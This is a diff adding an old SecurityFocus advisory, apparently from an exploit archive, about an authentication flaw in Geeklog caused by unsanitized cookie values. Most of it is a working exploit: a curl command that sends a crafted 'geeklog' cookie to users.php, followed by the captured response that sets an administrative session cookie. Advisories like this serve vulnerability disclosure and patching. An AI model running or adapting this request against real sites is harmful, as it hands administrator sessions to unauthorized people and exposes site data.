@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/7742/info
+
+Geeklog is reported to be prone to SQL injection attacks during authentication. This is due to insufficient sanitization of cookie values, which could permit an attacker to inject SQL code. This issue could be exploited to compromise Geeklog or to potentially launch attacks against the database, allowing for disclosure of sensitive information or other consequences. 
+
+curl -b geeklog=2.1 -D header.txt http://www.example.com/users.php
+
+header.txt contains valid session information for the administrative user:
+
+----------------header.txt -------------------------
+
+HTTP/1.1 200 OK
+Date: Sat, 17 May 2003 16:15:23 GMT
+Server: Apache
+Set-Cookie: gl_session=1828197392; path=/
+Set-Cookie: LastVisit=1053188123; expires=Sun, 16-May-2004 16:15:23 GMT;
+path=/
+Set-Cookie: LastVisitTemp=deleted; expires=Fri, 17-May-2002 16:15:22
+GMT; path=/; domain=http://www.example.com
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=iso-8859-1
+
+10
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+
+----------------header.txt -------------------------- 
